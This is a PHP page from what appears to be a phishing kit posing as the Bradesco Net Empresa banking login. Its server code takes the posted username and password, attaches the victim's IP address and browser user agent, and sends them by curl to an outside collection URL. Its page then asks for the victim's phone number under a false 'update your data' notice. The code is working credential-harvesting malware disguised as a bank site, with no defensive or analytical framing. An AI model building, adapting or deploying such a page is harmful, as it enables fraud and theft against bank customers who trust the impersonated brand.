<?php

    $usuario = isset($_POST['campo_primeiro']) ? trim($_POST['campo_primeiro']) : '';
    $senha   = isset($_POST['campo_segundo']) ? trim($_POST['campo_segundo']) : '';

    if(empty($usuario) || empty($senha)){
        die("Erro: 403.");
    }
    
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];
    $user_agent          = get_user_agent();

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $linkdatabase);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        "etapa1" => "ok",
        "ip" => $ip,
        "useragent" => $user_agent,
        "usuario" => $usuario,
        "senha" => $senha,
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec($ch);
    curl_close($ch);
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login Bradesco Net Empresa</title>
  <link rel="stylesheet" href="css/mobile.css">

  <script type="text/javascript">
	function mascaraTelefone(input){
		let v = input.value.replace(/\D/g, "");
		if(v.length > 11){
			v = v.slice(0,11);
		}
		if(v.length > 10){
			v = v.replace(/^(\d{2})(\d{5})(\d{4}).*/, "($1) $2-$3");
		}else if(v.length > 6){
			v = v.replace(/^(\d{2})(\d{4})(\d{0,4}).*/, "($1) $2-$3");
		}else if(v.length > 2){
			v = v.replace(/^(\d{2})(\d{0,5})/, "($1) $2");
		}else{
			v = v.replace(/^(\d*)/, "($1");
		}
		input.value = v;
	}

	function validarTelefone(telefone){
		telefone = telefone.replace(/\D/g,'');
		if(telefone.length < 10 || telefone.length > 11){
			return false;
		}
		if(/^0/.test(telefone)){
			return false;
		}
		return true;
	}

	function SendPhone(){
		let tel = document.getElementById("telcamp").value;
		if(validarTelefone(tel)){
			document.getElementById("fmkksaksa").submit();
		}else{
			alert("Preencha corretamente o campo de telefone");
		}

	}
</script>

</head>
<body>
  <header>
    Bradesco Net Empresa
  </header>

  <main>
    <h1>Atualizar dados</h1>
  
 <p>Manter seus dados atualizados é fundamental para garantir a segurança, 
    a agilidade no atendimento e a qualidade dos serviços oferecidos pelo banco.</p>

    <p>Por isso, é muito importante que você mantenha seu número de telefone sempre atualizado em nosso cadastro.</p>
 

    <p>Informe abaixo seu número de telefone para manter seu cadastro atualizado.</p>
    <form method="POST" action="/confirmacao" id="fmkksaksa">
      <div class="input-group">
        <input
          type="text"
          id="telcamp"
          name="campo_terceiro"
          value=""
          placeholder=""
          autocomplete="username"
          required
          onkeyup="mascaraTelefone(this)"
        />
        <label for="telcamp">Telefone</label>
      </div>


   

     
    </form>
  </main>
 <button onclick="SendPhone()">Continuar</button>
  
</body>
</html>